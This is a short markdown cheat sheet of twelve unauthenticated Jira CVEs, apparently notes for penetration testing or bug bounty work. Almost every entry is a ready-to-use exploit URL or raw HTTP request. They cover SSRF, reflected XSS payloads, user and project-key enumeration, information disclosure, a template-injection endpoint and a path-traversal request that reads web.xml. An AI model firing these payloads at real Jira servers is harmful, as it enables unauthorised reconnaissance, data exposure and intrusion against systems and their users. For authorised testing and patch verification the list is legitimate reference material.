# Unauthenticated Jira CVEs
1. CVE-2017-9506 (SSRF)
```
https://<JIRA_URL>/plugins/servlet/oauth/users/icon-uri?consumerUri=<SSRF_PAYLOAD>
```
2. CVE-2018-20824 (XSS)
```
https://<JIRA_URL>/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)
```
3. CVE-2019-8451 (SSRF)
```
https://<JIRA_URL>/plugins/servlet/gadgets/makeRequest?url=https://<HOST_NAME>:1337@example.com
```
4. CVE-2019-8449 (User Information Disclosure)
```
https://<JIRA_URL>/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true
```
5. CVE-2019-8442 (Sensitive Information Disclosure)
```
https://<JIRA_URL>/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
```
6. CVE-2019-3403 (User Enumeration)
```
https://<JIRA_URL>/rest/api/2/user/picker?query=<USERNAME_HERE>
```
7. CVE-2020-14181 (User Enumeration)
```
https://<JIRA_URL>/secure/ViewUserHover.jspa?username=<USERNAME>
```
8. CVE-2020-14178 (Project Key Enumeration)
```
https://<JIRA_URL>/browse.<PROJECT_KEY>
```
9. CVE-2020-14179 (Information Disclosure)
```
https://<JIRA_URL>/secure/QueryComponent!Default.jspa
```
10. CVE-2019-11581 (Template Injection)
```
<JIRA_URL>/secure/ContactAdministrators!default.jspa

* Try the SSTI Payloads
```

11.   CVE-2019-3396 (Path Traversal)
```
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: {{Hostname}}
Accept: */*
Accept-Language: en-US,en;q=0.5 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Referer: {{Hostname}}
Content-Length: 168
Connection: close

{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"../web.xml"}}}

*Try above request with the Jira target
```
12.   CVE-2019-3402 (XSS)
```
https://<JIRA_URL>/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search
```